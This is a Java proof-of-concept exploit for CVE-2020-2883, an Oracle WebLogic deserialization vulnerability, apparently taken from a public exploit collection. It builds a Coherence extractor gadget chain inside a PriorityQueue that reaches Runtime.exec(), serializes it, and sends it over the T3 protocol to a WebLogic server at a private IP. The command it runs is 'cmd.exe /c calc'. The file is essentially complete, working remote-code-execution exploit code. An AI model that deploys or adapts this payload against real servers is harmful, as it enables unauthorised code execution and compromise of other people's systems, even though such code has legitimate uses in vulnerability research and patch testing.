package com.supeream;

// com.supeream from https://github.com/5up3rc/weblogic_cmd/
// com.tangosol.util.extractor.ChainedExtractor from coherence.jar

import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/*
Author:Al1ex
Github:https://github.com/Al1ex

ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                siftDownUsingComparator()
                    com.tangosol.util.extractor.AbstractExtractor.compare()

                      com.tangosol.util.extractor.MultiExtractor.extract()
                        com.tangosol.util.extractor.ChainedExtractor.extract()
                            com.tangosol.util.extractor.ReflectionExtractor().extract()
                                Method.invoke()
                                    .......
                            com.tangosol.util.extractor.ReflectionExtractor().extract()
                                Method.invoke()
                                Runtime.exec()
*/

public class CVE_2020_2883_2 {

    public static void main(String[] args) throws Exception {
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ConstantExtractor(Runtime.class),
                new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]}),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                new ReflectionExtractor("exec", new Object[]{new String[]{"cmd.exe", "/c", "calc"}})
        };
        ChainedExtractor chainedExtractor = new ChainedExtractor<>(valueExtractors);
        MultiExtractor multiExtractor = new MultiExtractor();

        Field m_extractor = multiExtractor.getClass().getSuperclass().getDeclaredField("m_aExtractor");
        m_extractor.setAccessible(true);
        m_extractor.set(multiExtractor, new ValueExtractor[]{chainedExtractor});

        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add("foo");
        priorityQueue.add("bar");

        Field comparator = priorityQueue.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue,multiExtractor );

        byte[] payload = Serializables.serialize(priorityQueue);

        T3ProtocolOperation.send("192.168.174.144", "7001", payload);

    }
}